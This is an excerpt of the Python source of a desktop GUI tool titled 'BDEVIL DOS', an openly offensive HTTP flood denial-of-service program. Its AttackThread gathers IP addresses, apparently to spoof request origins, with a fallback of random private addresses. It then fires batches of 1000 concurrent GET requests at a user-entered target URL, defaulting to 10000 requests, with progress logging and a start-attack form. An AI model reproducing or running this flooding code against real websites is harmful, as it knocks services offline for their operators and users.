...
class AttackThread(QThread):
    ...
    async def get_all_ips(self):
        ...
        self.log_signal.emit(f"✓ Collected {len(all_ips)} unique IP addresses")
        return all_ips

    async def send_request(self, session, ip_address, request_num):
        ...
        try:
            ...
            async with session.get(self.target_url, headers=headers, timeout=timeout) as response:
                self.log_signal.emit(f"dos@root ~ #{request_num} | IP: {ip_address} | Status: {response.status}")
        except asyncio.TimeoutError:
            self.log_signal.emit(f"dos@root ~ #{request_num} | IP: {ip_address} | Timeout")
        except Exception as e:
            self.log_signal.emit(f"dos@root ~ #{request_num} | IP: {ip_address} | Error: {str(e)[:50]}...")
        
        
        progress = int((request_num / self.num_requests) * 100)
        self.progress_signal.emit(progress)

    async def attack(self):
        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log_signal.emit("No IP addresses collected! Using fallback IPs...")
            ip_list = [f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" for _ in range(1000)]
        
        self.log_signal.emit(f"Starting attack with {len(ip_list)} IPs and {self.num_requests} requests...")
        ...
        async with aiohttp.ClientSession(connector=connector) as session:
            ...
            batch_size = 1000
            for i in range(0, self.num_requests, batch_size):
                if not self.is_running:
                    break
                    
                end_idx = min(i + batch_size, self.num_requests)
                batch_requests = end_idx - i
                
                tasks = []
                for j in range(batch_requests):
                    if not self.is_running:
                        break
                    ip_address = random.choice(ip_list)
                    task = self.send_request(session, ip_address, i + j + 1)
                    tasks.append(task)
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("BDEVIL DOS - pyvrax")
...
QProgressBar::chunk {
    ...
    border-radius: 4px;
        ...
        self.load_image("https://i.ibb.co/JWXjRQDF/938283.png")

        
        title_label = QLabel("BDEVIL DoS - CREATOR: pyvrax")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #4da6ff; font-size: 15px; font-weight: bold; margin: 10px;")
        ...
        self.requests_input.setText("10000")
        ...
        self.status_label.setStyleSheet("color: #4da6ff; font-size: 15px;")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "Alert", " Number of requests must be an integer.")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Alert", " Please provide a valid URL and number of requests.")
            return
        ...
        self.attack_thread.progress_signal.connect(self.progress_bar.setValue)
